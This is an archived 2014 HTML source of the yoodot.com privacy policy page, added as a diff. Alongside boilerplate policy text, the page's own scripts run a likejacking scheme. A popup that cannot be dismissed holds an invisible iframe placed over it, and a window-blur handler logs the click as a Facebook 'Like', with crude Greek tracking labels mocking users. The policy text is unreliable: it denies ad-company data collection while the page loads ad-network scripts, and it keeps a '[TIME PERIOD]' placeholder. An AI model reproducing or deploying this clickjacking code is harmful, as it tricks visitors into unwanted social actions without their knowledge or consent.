@@ -1,0 +1,955 @@
+<!--The following is the downloaded HTML source of the yoodot.com privacy policy that was archived on 2014-10-15.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20141015104145id_/http%3A//www.yoodot.com/privacy-policy) for the most accurate reproduction.-->
+
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><head>
+<link rel="stylesheet" href="http://code.jquery.com/ui/1.10.3/themes/smoothness/jquery-ui.css">
+<script async="" src="//www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://platform.stumbleupon.com/1/widgets.js"></script><script type="text/javascript" async="" src="https://apis.google.com/js/plusone.js"></script><script id="twitter-wjs" async="" src="https://platform.twitter.com/widgets.js"></script><script src="http://code.jquery.com/jquery-1.9.1.js"></script>
+<script src="http://code.jquery.com/ui/1.10.3/jquery-ui.js"></script>
+<script src="http://www.yoodot.com/wp-content/themes/maxmag/js/kip.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script src="http://www.yoodot.com/wp-content/themes/maxmag/js/magnific-popup.js"></script>
+<link rel="stylesheet" type="text/css" href="http://www.yoodot.com/wp-content/themes/maxmag/css/magnific-popup.css">
+<script type="text/javascript" src="http://www.adcash.com/script/java.php?option=rotateur&amp;rotateur=291346"></script>
+<script src="//ads.lfstmedia.com/getad?site=198080" type="text/javascript"></script>
+<style type="text/css">
+.white-popup{
+	position: relative;
+	background: #FFF;
+	padding: 20px;
+	width: auto;
+	max-width: 500px;
+	margin: 20px auto;
+	z-index: 9999;
+}
+.fb-like-box, .fb-like-box span, .fb-like-box.fb_iframe_widget span iframe {
+    width: 100% !important;
+}
+
+
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<script type="text/javascript">
+	
+		function getCookie(c_name)
+	{
+		var c_value = document.cookie;
+		var c_start = c_value.indexOf(" " + c_name + "=");
+		if (c_start == -1)
+		{
+		c_start = c_value.indexOf(c_name + "=");
+		}
+		if (c_start == -1)
+		{
+		c_value = null;
+		}
+		else
+		{
+		c_start = c_value.indexOf("=", c_start) + 1;
+		var c_end = c_value.indexOf(";", c_start);
+		if (c_end == -1)
+		{
+		c_end = c_value.length;
+		}
+		c_value = unescape(c_value.substring(c_start,c_end));
+		}
+		return c_value;
+	}
+
+	function setCookie(c_name,value,exdays)
+	{
+		var exdate=new Date();
+		exdate.setDate(exdate.getDate() + exdays);
+		var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString())+";domain=.yoodot.com;path=/";
+		document.cookie=c_name + "=" + c_value;
+	}
+
+	function realPopup(){
+		$(document).ready(function() {
+		 	$('.open-popup-link').magnificPopup({
+			  type:'inline',
+			  callbacks: {
+			    open: function() {
+			    	window.magnificPop = $.magnificPopup.instance;
+			    	setTimeout(function(){
+			    		if(window.magnificPop.isOpen){
+			    			$('.open-popup-link').magnificPopup('close');
+			    			_gaq.push(['_trackEvent', 'PopUp', 'Timeout', 'Κοιμήθηκε ο μαλάκας και το popup έκλεισε']);
+			    		}
+			    		
+			    	},17000);
+			      $(document).on('scrollstart', false);
+			    },
+			    close: function() {
+			     $(document).off('scrollstart');
+			 	}
+			  },
+			  closeOnBgClick: false,
+			  enableEscapeKey: false,
+			  midClick: true // Allow opening popup on middle mouse click. Always set it to true if you don't provide alternative source in href.
+			}).magnificPopup('open');
+			var overiFrame = -1;
+			    $('#krufo').hover( function() {
+			        overiFrame = 1;
+			    }, function() {
+			        overiFrame = -1
+			    });
+			$(window).blur( function() {
+			        if( overiFrame != -1 ){
+			        	setCookie("popup5","1",15);
+			        	setTimeout(function(){$('.open-popup-link').magnificPopup('close');},600);
+			    		_gaq.push(['_trackEvent', 'PopUp', 'Like', 'Έκανε like το αγόρι μου']);
+		  	
+			        }
+			            
+			    });
+		});
+		function checkFocus() {
+            if(document.activeElement == document.getElementById('krufo')) {
+                  $('.open-popup-link').magnificPopup('close');
+                  clearInterval(iframe_interval);
+              
+            } 
+        }
+		//var iframe_interval=window.setInterval(checkFocus, 800);
+
+	}
+
+	function createPopup(){
+    	$('#popup').dialog({
+			modal:true,
+			open:function(){
+			     $('#close-button').click(function() { $("#popup").dialog("close"); });
+			     $('.ui-dialog-titlebar').remove();
+			     $('.ui-dialog').css({
+			      border : '0',
+			      background : '0',
+			      position: 'fixed',
+			      height: '500px',
+			      width: '520px',
+			      top: '0',
+			      left: '0',
+			      right: '0',
+			      bottom: '0',
+			      margin: 'auto'
+			})
+			     $('.ui-widget-overlay').css('opacity','0.8')
+			     
+			}
+
+		})  
+		function checkFocus() {
+            if(document.activeElement == document.getElementById('krufo')) {
+                  $("#popup").dialog("close");
+                  clearInterval(iframe_interval);
+              
+            } 
+        }
+		var iframe_interval=window.setInterval(checkFocus, 800);
+    }
+
+    function valtoStinLista(a){
+    	$(a).html('To vales!');
+    	if(getCookie('urls')){
+    		var urls=getCookie('urls');
+    		urls=urls.split(',');
+    		urls.push(document.location.href);
+    		setCookie('urls',urls.toString(),1);
+    	}
+		else{
+			setCookie('urls',document.location.href,1);
+		}
+    }
+    function iAmReady(){
+    	if(getCookie('urls')){
+    		var urls=getCookie('urls');
+    		urls=urls.split(',');
+    		urls=urls.unique();
+    		urls=urls.exclude(document.location.origin);
+    		urls=urls.exclude(document.location.origin+'/');
+    		q='';urls.each(function(n){q+=n+'\n'})
+    		$('<textarea>',{id:'aaa',style:'min-height: 203px!important; min-width: 930px; font-size:12px',text:q}).dialog({width:'auto',height:'auto',modal:'true',beforeClose: function() {setCookie('urls','',0);}})
+    		$('.ui-dialog').css('position','fixed');
+    		$('.ui-dialog').css('top','203px');
+    	}
+		
+    }
+</script>
+<meta property="fb:app_id" content="172100189655763">
+
+
+
+<title>
+
+  Privacy Policy - yoodot
+</title>
+
+
+
+<link rel="stylesheet" type="text/css" media="all" href="http://www.yoodot.com/wp-content/themes/maxmag/style.css">
+	<link rel="stylesheet" type="text/css" href="http://yoodot.com/sticky-like/best/css/social-connect.css" media="screen">
+
+<!--[if IE]>
+
+<link rel="stylesheet" type="text/css" href="http://www.yoodot.com/wp-content/themes/maxmag/css/iecss.css" />
+
+<![endif]-->
+
+<link rel="shortcut icon" href="http://www.yoodot.com/wp-content/uploads/2014/06/favicon.png">
+<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://www.yoodot.com/feed/">
+
+<link rel="alternate" type="text/xml" title="RSS .92" href="http://www.yoodot.com/feed/rss/">
+
+<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="http://www.yoodot.com/feed/atom/">
+
+<link rel="pingback" href="http://www.yoodot.com/xmlrpc.php">
+
+
+
+
+<style type="text/css">
+
+
+</style>
+
+
+
+<link rel="alternate" type="application/rss+xml" title="yoodot » Feed" href="http://www.yoodot.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="yoodot » Comments Feed" href="http://www.yoodot.com/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="yoodot » Privacy Policy Comments Feed" href="http://www.yoodot.com/privacy-policy/feed/">
+<link rel="stylesheet" id="mm-style-css" href="http://www.yoodot.com/wp-content/themes/maxmag/style.css?ver=3.9.2" type="text/css" media="all">
+<link rel="stylesheet" id="reset-css" href="http://www.yoodot.com/wp-content/themes/maxmag/css/reset.css?ver=3.9.2" type="text/css" media="all">
+<link rel="stylesheet" id="flexcss-css" href="http://www.yoodot.com/wp-content/themes/maxmag/css/flexslider.css?ver=3.9.2" type="text/css" media="all">
+<link rel="stylesheet" id="googlefonts-css" href="http://fonts.googleapis.com/css?family=Open+Sans+Condensed%3A300%2C700%7COpen+Sans%3A400%2C700&amp;subset=latin%2Clatin-ext%2Ccyrillic%2Ccyrillic-ext%2Cgreek-ext%2Cgreek%2Cvietnamese&amp;ver=3.9.2" type="text/css" media="all">
+<link rel="stylesheet" id="theiaPostSlider-css" href="http://www.yoodot.com/wp-content/themes/maxmag/theia-post-slider/css/buttons-orange.css?ver=3.9.2" type="text/css" media="all">
+<script type="text/javascript" src="http://www.yoodot.com/wp-includes/js/jquery/jquery.js?ver=1.11.0"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/js/jquery.flexslider.js?ver=3.9.2"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/js/jquery.elastislide.js?ver=3.9.2"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/js/scripts.js?ver=3.9.2"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/js/respond.min.js?ver=3.9.2"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/js/retina.js?ver=3.9.2"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/theia-post-slider/js/balupton-history.js/history.js?ver=1.7.1"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/theia-post-slider/js/balupton-history.js/history.adapter.jquery.js?ver=1.7.1"></script>
+<script type="text/javascript" src="http://www.yoodot.com/wp-content/themes/maxmag/theia-post-slider/js/tps-transition-slide.js?ver=1.0.8"></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.yoodot.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.yoodot.com/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="Sample Page" href="http://www.yoodot.com/sample-page/">
+<link rel="next" title="Terms of Service" href="http://www.yoodot.com/terms-of-service/">
+<meta name="generator" content="WordPress 3.9.2">
+<link rel="canonical" href="http://www.yoodot.com/privacy-policy/">
+<link rel="shortlink" href="http://www.yoodot.com/?p=11">
+
+
+		<style type="text/css">
+
+		a, a:visited, #twtr-widget-1 .twtr-tweet a { color: #004276; }
+
+		h3.category-heading, .toggle { background: #1ca933; }
+
+		.home-widget h3, .home-widget h3 a, .middle-widget h3, .middle-widget h3 a, .sidebar-widget h3, .sidebar-widget h3 a, .bottom-widget h3, .bottom-widget h3 a, .widget-container h3, .widget-container h3 a, .multi-category h3,  ul.tabs li.active h4 a, #related-posts h3, h3#reply-title, h2.comments { color: #1ca933; }
+
+		#main-nav ul li:hover, #main-nav .current-menu-item, #main-nav .current-post-parent { background: #1ca933 url(http://www.yoodot.com/wp-content/themes/maxmag/images/nav-bg.png) top repeat-x; }
+
+		#main-nav ul li:hover ul { border-top: 5px solid #1ca933; }
+
+		#main-nav-wrapper { background: #555555 url(http://www.yoodot.com/wp-content/themes/maxmag/images/nav-bg.png) top repeat-x; border-bottom: 5px solid #1ca933; }
+
+		#nav-mobi select { background: #555555  url(http://www.yoodot.com/wp-content/themes/maxmag/images/triangle-dark.png) no-repeat right; }
+
+		ul.tabs li { background: #1ca933; }
+
+		#wallpaper { background: url() no-repeat 50% 0; }
+
+		</style>
+
+</head>
+
+
+
+<body class="page page-id-11 page-template-default">
+
+	<div id="fb-root"></div>
+	<script>
+	(function(a){(jQuery.browser=jQuery.browser||{}).mobile=/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))})(navigator.userAgent||navigator.vendor||window.opera);
+	  window.fbAsyncInit = function() {
+	    // init the FB JS SDK
+	    FB.init({
+		  	appId      : '1445278799055620', // App ID from the App Dashboard
+		  	channelUrl : '//www.yoodot.com/channel.php', // Channel File for x-domain communication
+		  	status     : true, // check the login status upon init?
+		  	cookie     : true, // set sessions cookies to allow your server to access the session?
+		  	xfbml      : true  // parse XFBML tags on this page?
+	    });
+
+	    // Additional initialization code such as adding Event Listeners goes here
+	    // 
+		FB.Event.subscribe('edge.create', function(targetUrl) {
+		  //_gaq.push(['_trackSocial', 'facebook', 'like', targetUrl]);
+		  //ga('send', 'social', 'facebook', 'like', targetUrl);
+		});    
+
+		FB.Event.subscribe('edge.remove', function(targetUrl) {
+		  //_gaq.push(['_trackSocial', 'facebook', 'unlike', targetUrl]);
+		  //ga('send', 'social', 'facebook', 'unlike', targetUrl);
+		});	
+	
+	FB.Event.subscribe('edge.create', function(response) {		
+		//_gaq.push(['_trackSocial', 'facebook', 'like', response]);
+		
+		$('.open-popup-link').magnificPopup('close');
+                  
+	});
+	
+	FB.Event.subscribe('edge.remove', function(response) {
+		 //_gaq.push(['_trackSocial', 'facebook', 'unlike', response])
+		//$.cookie('showThis', null);
+
+	});
+	
+	FB.Event.subscribe('message.send', function(targetUrl) {
+	 // _gaq.push(['_trackSocial', 'facebook', 'send', targetUrl]);
+	});
+
+  };
+  
+	  
+	  
+
+
+	  // Load the SDK's source Asynchronously
+	  (function(d){
+	     var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
+	     if (d.getElementById(id)) {return;}
+	     js = d.createElement('script'); js.id = id; js.async = true;
+	     js.src = "//connect.facebook.net/en_US/all.js";
+	     ref.parentNode.insertBefore(js, ref);
+	   }(document));
+	</script>
+
+<div id="site">
+        	
+
+
+	<div id="nav">
+
+		<div id="main-nav-wrapper">
+
+			<div id="main-nav">
+
+				<div class="menu-menu-container"><ul id="menu-menu" class="menu"><li id="menu-item-19" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-19"><a href="http://www.yoodot.com">Home</a></li>
+<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-18"><a href="http://www.yoodot.com/category/fun/">fun</a></li>
+<li id="menu-item-141" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-141"><a href="http://www.yoodot.com/category/gifs/">gifs</a></li>
+</ul></div>
+			</div><!--main-nav-->
+
+			<div id="nav-mobi">
+
+				<div class="menu-menu-container"><select><option value="#">Menu</option><option value="http://www.yoodot.com">Home</option>
+<option value="http://www.yoodot.com/category/fun/">fun</option>
+<option value="http://www.yoodot.com/category/gifs/">gifs</option>
+</select></div>
+			</div><!--nav-mobi-->
+
+		</div><!--main-nav-wrapper-->
+
+	</div><!--nav-->
+
+	<div id="wrapper">
+
+		
+		<div id="inner-wrapper">
+
+			<div id="content">
+
+				<div id="main-header-wrapper">
+
+					<div id="header">
+
+						<div id="logo" itemscope="" itemtype="http://schema.org/Organization">
+
+							
+							<a itemprop="url" href="http://www.yoodot.com"><img itemprop="logo" src="http://www.yoodot.com/wp-content/uploads/2014/06/logo.png" alt="yoodot"></a>
+
+							
+						</div><!--logo-->
+
+						<div id="header-info">
+
+							<div id="small-nav">
+
+								<div class="menu-pages-container"><ul id="menu-pages" class="menu"><li id="menu-item-16" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-16"><a href="http://www.yoodot.com/terms-of-service/">Terms of Service</a></li>
+<li id="menu-item-17" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-11 current_page_item menu-item-17"><a href="http://www.yoodot.com/privacy-policy/">Privacy Policy</a></li>
+</ul></div>
+							</div><!--small-nav-->
+
+						</div><!--header-info-->
+
+					</div><!--header-->
+
+				</div><!--main-header-wrapper-->
+
+				<div id="test-popup" class="white-popup mfp-hide">
+					<iframe id="krufo" scrolling="no" src="http://www.yoodot.com/wp-content/themes/maxmag/custom/krufo.php"></iframe>
+					<div id="krufo2"><div style="width: 50px;overflow: hidden;" class="fb-like" data-href="https://www.facebook.com/pages/HOT-Surface-Do-NOT-TOUCH-Hmmmm-I-wonder-how-hot-is-hot-AHHH/186033394921712?fref=ts" data-layout="standard" data-action="like" data-show-faces="true" data-share="true"></div></div>
+					<h3 class="headline">Find us on Facebook</h3>
+					<div class="fb-like-box" data-href="https://www.facebook.com/zdouf" data-width="292" data-show-faces="true" data-stream="false" data-header="false"></div>
+				</div>
+
+				<div id="fb-root"></div>
+		
+	<a style="display:none;" href="mobile-friendly-page.html" data-mfp-src="#test-popup" class="open-popup-link">Show inline popup</a>
+<!--content-top ticker-->
+<style type="text/css">
+		#popup{
+			width: 520px;
+			position: absolute;
+			overflow: -moz-hidden-unscrollable;
+		}
+		.fb-like-box-custom{
+			margin-top: -314px;
+			background-color: white;
+			margin-left: 10px;
+		}
+		#krufo{
+			display: none;
+			width: 56px;
+			height: 30px;
+			margin-top: -17px;
+			margin-left: 91%;
+			opacity: 0;
+			position: relative;
+			z-index: 9999;
+
+		}
+		#krufo2{
+			display: none;
+			width: 56px;
+			height: 30px;
+			margin-top: -8px;
+			margin-left: 93%;
+			opacity: 0;
+			position: relative;
+			z-index: 9999;
+			
+		}
+	</style>
+	<script type="text/javascript">
+		var cookie_popup=getCookie('popup5');
+		  if (cookie_popup==null || cookie_popup=="")
+		  {
+		  	realPopup();
+		  	/*if(jQuery.browser.mobile)
+		  	{
+		  		$('#krufo2').show();
+
+		  	}
+		  	else{*/
+		  		$('#krufo').show();
+		  	//}
+
+		  }
+	</script>
+<div id="main">
+	<div id="post-area">
+				<div class="breadcrumb">
+			<div id="crumbs"><a href="http://www.yoodot.com">Home</a>  &nbsp; &gt; &nbsp;  <span class="current">Privacy Policy</span></div>		</div><!--breadcrumb-->
+		<h1>Privacy Policy</h1>
+		<div id="content-area">
+			<p>We only collect anonymous information.<br>
+We use technologies like cookies (small files stored by your browser), web beacons, or unique device identifiers to anonymously identify your computer or device so we can deliver a better experience. Our systems also log information like your browser, operating system and IP address.</p>
+<p>We do not collect personally identifiable information about you. In other words, we do not collect information such as your name, address, phone number or email address.</p>
+<p>We do not knowingly contact or collect personal information from children under 13. If you believe we have inadvertently collected such information, please contact us so we can promptly obtain parental consent or remove the information.</p>
+<p>We do not store or share your precise location.</p>
+<p>We do not use or collect your precise geographic location.</p>
+<p>You can request to see or delete your personal data.</p>
+<p>You can sign into your account to see or delete any personally identifiable information we have stored, such as your name, address, email or phone number. You can also contact us by email to request to see or delete this information.</p>
+<p>We keep personal data for a limited period.</p>
+<p>Our systems are designed to retain log data for up to [TIME PERIOD] after it is collected. We remove personally identifiable information (such as your name, address, email or phone number) and other preferences associated with your account promptly after you delete your account.</p>
+<p>We don’t share your personal data with other companies.<br>
+We generally do not share personally identifiable information (such as name, address, email or phone) with other companies.</p>
+<p>No ad companies collect data through our service.<br>
+We do not allow advertising companies to collect data through our service for ad targeting.</p>
+<p>Analytics providers access data on our behalf.<br>
+Analytics companies may access anonymous data (such as your IP address or device ID) to help us understand how our services are used. They use this data solely on our behalf. They do not share it except in aggregate form; no data is shared as to any individual user. Click to see company privacy policies that govern their use of data.</p>
+<p>We take steps to protect personal information<br>
+We take reasonable steps to secure your personally identifiable information against unauthorized access or disclosure. We encrypt transmission of data on pages where you provide payment information. However, no security or encryption method can be guaranteed to protect information from hackers or human error.</p>
+<p>Information we collect may be stored or processed on computers located in any country where we do business.</p>
+<p>Special situations may require disclosure of your data.<br>
+To operate the service, we also may make identifiable and anonymous information available to third parties in these limited circumstances: (1) with your express consent, (2) when we have a good faith belief it is required by law, (3) when we have a good faith belief it is necessary to protect our rights or property, or (4) to any successor or purchaser in a merger, acquisition, liquidation, dissolution or sale of assets. Your consent will not be required for disclosure in these cases, but we will attempt to notify you, to the extent permitted by law to do so.</p>
+<p>You can review more privacy-related information.<br>
+This privacy policy was last updated on 02/05/2013. Our privacy policy may change from time to time. If we make any material changes to our policies, we will place a prominent notice on our website or application. If the change materially affects registered users, we will send a notice to you by email, push notification or text.</p>
+					</div><!--content-area-->
+			</div><!--post-area-->
+</div><!--main -->
+
+<div id="sidebar-wrapper">
+	<div class="middle-side">
+		<div class="middle-widget">
+			<h3>Latest News</h3>
+			<ul class="middle-widget">
+								<li>
+					<a href="http://www.yoodot.com/10961/this-couple-wanted-their-wedding-bands-to-be-special-so-they-did-this-and-its-awesome/" rel="bookmark" class="main-headline">This Couple Wanted Their Wedding Bands To Be Special. So They Did THIS… And It’s Awesome.</a>
+					<p>Engagements and marriages are full of traditions that most people...</p>
+					<div class="headlines-info">
+						<ul class="headlines-info">
+							<li>Posted June 17, 2014</li>
+							<li class="comments-icon"><a href="http://www.yoodot.com/10961/this-couple-wanted-their-wedding-bands-to-be-special-so-they-did-this-and-its-awesome/#comments">0</a></li>
+						</ul>
+					</div><!--headlines-info-->
+				</li>
+								<li>
+					<a href="http://www.yoodot.com/10958/theres-something-odd-about-one-of-these-dogs-hey-wait-a-second/" rel="bookmark" class="main-headline">There’s Something Odd About One Of These Dogs… HEY, Wait A Second!</a>
+					<p>Pigs are one of the most intelligent domesticated animals on...</p>
+					<div class="headlines-info">
+						<ul class="headlines-info">
+							<li>Posted June 17, 2014</li>
+							<li class="comments-icon"><a href="http://www.yoodot.com/10958/theres-something-odd-about-one-of-these-dogs-hey-wait-a-second/#comments">0</a></li>
+						</ul>
+					</div><!--headlines-info-->
+				</li>
+								<li>
+					<a href="http://www.yoodot.com/10955/here-are-the-15-best-toys-from-the-1980s-i-forgot-all-about-these-especially-2/" rel="bookmark" class="main-headline">Here Are the 15 Best Toys From The 1980s. I Forgot All About These… Especially #2.</a>
+					<p>Hey, Children of the 80′s, we found your favorite toys!...</p>
+					<div class="headlines-info">
+						<ul class="headlines-info">
+							<li>Posted June 17, 2014</li>
+							<li class="comments-icon"><a href="http://www.yoodot.com/10955/here-are-the-15-best-toys-from-the-1980s-i-forgot-all-about-these-especially-2/#comments">0</a></li>
+						</ul>
+					</div><!--headlines-info-->
+				</li>
+								<li>
+					<a href="http://www.yoodot.com/10952/21-reasons-summer-sucks-for-anyone-with-big-boobs/" rel="bookmark" class="main-headline">21 Reasons Summer Sucks For Anyone With Big&nbsp;Boobs</a>
+					<p>Two words: Underboob sweat. 1. Underboob sweat. Literally the bane...</p>
+					<div class="headlines-info">
+						<ul class="headlines-info">
+							<li>Posted June 16, 2014</li>
+							<li class="comments-icon"><a href="http://www.yoodot.com/10952/21-reasons-summer-sucks-for-anyone-with-big-boobs/#comments">0</a></li>
+						</ul>
+					</div><!--headlines-info-->
+				</li>
+								<li>
+					<a href="http://www.yoodot.com/10949/31-joke-tattoos-you-wont-believe-actually-exist/" rel="bookmark" class="main-headline">31 Joke Tattoos You Won’t Believe Actually&nbsp;Exist</a>
+					<p>#FunnyTattoo. 1. If you have to be bald you might...</p>
+					<div class="headlines-info">
+						<ul class="headlines-info">
+							<li>Posted May 29, 2014</li>
+							<li class="comments-icon"><a href="http://www.yoodot.com/10949/31-joke-tattoos-you-wont-believe-actually-exist/#comments">0</a></li>
+						</ul>
+					</div><!--headlines-info-->
+				</li>
+								<li>
+					<a href="http://www.yoodot.com/10939/24-signs-youre-not-ready-for-adulthood/" rel="bookmark" class="main-headline">24 Signs You’re Not Ready For Adulthood</a>
+					<p>I NEED AN GROWN UP! 1. If you’ve ever had...</p>
+					<div class="headlines-info">
+						<ul class="headlines-info">
+							<li>Posted May 23, 2014</li>
+							<li class="comments-icon"><a href="http://www.yoodot.com/10939/24-signs-youre-not-ready-for-adulthood/#comments">0</a></li>
+						</ul>
+					</div><!--headlines-info-->
+				</li>
+								<li>
+					<a href="http://www.yoodot.com/10930/23-people-you-know-are-definitely-dead-now/" rel="bookmark" class="main-headline">23 People You Know Are Definitely Dead&nbsp;Now</a>
+					<p>And by dead, I mean not dead at all. 1....</p>
+					<div class="headlines-info">
+						<ul class="headlines-info">
+							<li>Posted May 22, 2014</li>
+							<li class="comments-icon"><a href="http://www.yoodot.com/10930/23-people-you-know-are-definitely-dead-now/#comments">0</a></li>
+						</ul>
+					</div><!--headlines-info-->
+				</li>
+							</ul>
+		</div>
+	</div><!--middle-side-->
+	<div class="side">
+		<div class="sidebar-widget"><h3>Latest News</h3>
+
+
+
+
+			<ul class="middle-widget">
+
+				
+				<li>
+
+					<a href="http://www.yoodot.com/10961/this-couple-wanted-their-wedding-bands-to-be-special-so-they-did-this-and-its-awesome/" rel="bookmark" class="main-headline">This Couple Wanted Their Wedding Bands To Be Special. So They Did THIS… And It’s Awesome.</a>
+
+					<p>Engagements and marriages are full of traditions that most people...</p>
+
+					<div class="headlines-info">
+
+						<ul class="headlines-info">
+
+							<li>06.17.2014</li>
+
+							<!-- <li class="comments-icon"><a href=""></a></li> -->
+
+						</ul>
+
+					</div><!--headlines-info-->
+
+				</li>
+
+				
+				<li>
+
+					<a href="http://www.yoodot.com/10958/theres-something-odd-about-one-of-these-dogs-hey-wait-a-second/" rel="bookmark" class="main-headline">There’s Something Odd About One Of These Dogs… HEY, Wait A Second!</a>
+
+					<p>Pigs are one of the most intelligent domesticated animals on...</p>
+
+					<div class="headlines-info">
+
+						<ul class="headlines-info">
+
+							<li>06.17.2014</li>
+
+							<!-- <li class="comments-icon"><a href=""></a></li> -->
+
+						</ul>
+
+					</div><!--headlines-info-->
+
+				</li>
+
+				
+				<li>
+
+					<a href="http://www.yoodot.com/10955/here-are-the-15-best-toys-from-the-1980s-i-forgot-all-about-these-especially-2/" rel="bookmark" class="main-headline">Here Are the 15 Best Toys From The 1980s. I Forgot All About These… Especially #2.</a>
+
+					<p>Hey, Children of the 80′s, we found your favorite toys!...</p>
+
+					<div class="headlines-info">
+
+						<ul class="headlines-info">
+
+							<li>06.17.2014</li>
+
+							<!-- <li class="comments-icon"><a href=""></a></li> -->
+
+						</ul>
+
+					</div><!--headlines-info-->
+
+				</li>
+
+				
+				<li>
+
+					<a href="http://www.yoodot.com/10952/21-reasons-summer-sucks-for-anyone-with-big-boobs/" rel="bookmark" class="main-headline">21 Reasons Summer Sucks For Anyone With Big&nbsp;Boobs</a>
+
+					<p>Two words: Underboob sweat. 1. Underboob sweat. Literally the bane...</p>
+
+					<div class="headlines-info">
+
+						<ul class="headlines-info">
+
+							<li>06.16.2014</li>
+
+							<!-- <li class="comments-icon"><a href=""></a></li> -->
+
+						</ul>
+
+					</div><!--headlines-info-->
+
+				</li>
+
+				
+				<li>
+
+					<a href="http://www.yoodot.com/10949/31-joke-tattoos-you-wont-believe-actually-exist/" rel="bookmark" class="main-headline">31 Joke Tattoos You Won’t Believe Actually&nbsp;Exist</a>
+
+					<p>#FunnyTattoo. 1. If you have to be bald you might...</p>
+
+					<div class="headlines-info">
+
+						<ul class="headlines-info">
+
+							<li>05.29.2014</li>
+
+							<!-- <li class="comments-icon"><a href=""></a></li> -->
+
+						</ul>
+
+					</div><!--headlines-info-->
+
+				</li>
+
+				
+				<li>
+
+					<a href="http://www.yoodot.com/10939/24-signs-youre-not-ready-for-adulthood/" rel="bookmark" class="main-headline">24 Signs You’re Not Ready For Adulthood</a>
+
+					<p>I NEED AN GROWN UP! 1. If you’ve ever had...</p>
+
+					<div class="headlines-info">
+
+						<ul class="headlines-info">
+
+							<li>05.23.2014</li>
+
+							<!-- <li class="comments-icon"><a href=""></a></li> -->
+
+						</ul>
+
+					</div><!--headlines-info-->
+
+				</li>
+
+				
+				<li>
+
